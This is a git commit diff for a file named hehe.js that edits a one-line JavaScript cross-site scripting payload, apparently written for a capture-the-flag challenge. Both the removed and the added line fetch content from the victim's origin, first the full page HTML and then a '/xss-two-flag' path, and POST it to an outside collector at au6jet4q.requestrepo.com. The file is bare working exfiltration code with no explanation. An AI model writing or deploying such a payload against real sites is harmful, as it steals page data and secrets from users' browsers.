e2f4c2444c67c3fc73d4b16dddf2e1e1c5ab561c
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2024-05-05 13:56:05 +0700

    Update hehe.js

--- hehe.js
+++ hehe.js
@@ -1,2 +1,2 @@
-fetch('http://localhost:1234/mo.js').then(res =>res.text()).then(data=>fetch("http://au6jet4q.requestrepo.com/",{method:"POST",mode:"no-cors",body:document.documentElement.outerHTML
+fetch('/xss-two-flag').then(res =>res.text()).then(data=>fetch("http://au6jet4q.requestrepo.com/",{method:"POST",mode:"no-cors",body:data
 }))
